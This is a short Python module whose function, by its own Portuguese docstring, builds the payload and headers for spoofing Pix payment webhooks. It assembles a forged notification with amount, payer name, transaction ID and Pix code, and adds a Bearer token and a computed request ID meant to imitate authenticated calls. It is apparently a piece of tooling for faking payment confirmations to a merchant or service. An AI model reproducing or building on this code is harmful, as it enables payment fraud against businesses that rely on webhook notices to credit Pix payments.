import hashlib
import jwt
import datetime
from config.config_loader import load_headers_template


def spoof_webhook_request(pix_code, jwt_token, user_id, valor, endpoint, nome, txid):
    """Gera payload e headers para spoof de webhook Pix"""
    # Monta payload
    payload = {
        "jwt": jwt_token,
        "userid": user_id,
        "valor": f"{valor:.2f}",
        "nome": nome,
        "txid": txid,
        "pix_code": pix_code
    }

    # Headers simulando HMAC/AES ou template definido
    headers = load_headers_template().copy() if hasattr(load_headers_template, '__call__') else {}
    # Campos de autenticação e rastreamento
    headers["X-Request-ID"] = hashlib.md5(txid.encode()).hexdigest()
    headers["X-Timestamp"] = str(int(datetime.datetime.utcnow().timestamp()))
    headers["Authorization"] = f"Bearer {jwt_token}"

    return payload, headers 